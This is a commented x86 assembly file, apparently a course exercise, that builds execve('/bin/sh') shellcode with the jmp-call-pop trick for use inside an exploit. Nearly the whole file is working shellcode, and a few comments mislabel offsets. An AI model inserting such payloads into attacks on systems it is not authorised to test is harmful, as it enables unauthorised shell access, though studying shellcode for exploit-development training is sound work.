; File: execveShellJmpCallPop.nasm
; Author: Kevin Ren, originally Professor Viviek of SLAE
; Purpose: using execve sys call to execute /bin/sh within machine code, within exploit
; Method: Jmp short, call, pop technique


; EXECVE SYNOPSIS: 
; 		int execve(const char *filename, char *const argv[], char *const envp[]);
;		syscall 11
; TO INVOKE: 
; 		eax = 11
; 		ebx = memory of string of null/zeros terminated path 
; 		ecx = memory of structure/continous memory of null/zeros terminated filename and NULL/zeros, 
;			because /bin/sh exe takes no arguments in this case
; 		edx = memory of NULL/zeros
;		int 0x80

; GOAL: 
; 		1. include dummy bytes for the entire string that includes all the arguments needed above
;		2. using jmp call pop, to extract the address of (1)
;		3. replace all nulls with zeros
; 		4. manipulate (1) and replace all dummy bytes with syscall 11 args
;		5. issue sys call, using arithmetic of register and memory manipulation 

global _start


section .text

_start: 
	jmp short call_shellcode

shellcode: 
	
	pop esi						; esi now contains the address points to "/bin/shABBBBCCCC"
	
	xor ebx, ebx					; zeroing out ebx

	mov byte [esi + 7], bl				; replacing A with one byte of zero
	mov dword [esi + 8], esi			; replacing Bs with the dword/4bytes size address of the path string stored in esi
	mov dword [esi + 12], ebx			; replacing Cs with dword/4bytes of zeros from zeroed out ebx

	xor eax, eax					; zeroing out eax, we are now about to start issuing the execve syscall
	mov al, 0xb					; 0xb is 11 in hex
	
	lea ebx, [esi]					; esi's value is the address of /bin/sh0...
	lea ecx, [esi + 8]				; esi + 8 is the address of /bin/sh0...
	lea edx, [esi + 12]				; esi + 12 is the address of 0000
	
	int 0x80


	
call_shellcode:

	call shellcode

	; see if : works, if not please delete
	path: db "/bin/sh/ABBBBCCCC"			; where A is a byte of NULL/zero
							; BBBB is four byte/dword of address points to exe filename
							; CCCC is four bytes of NULLs/zeros
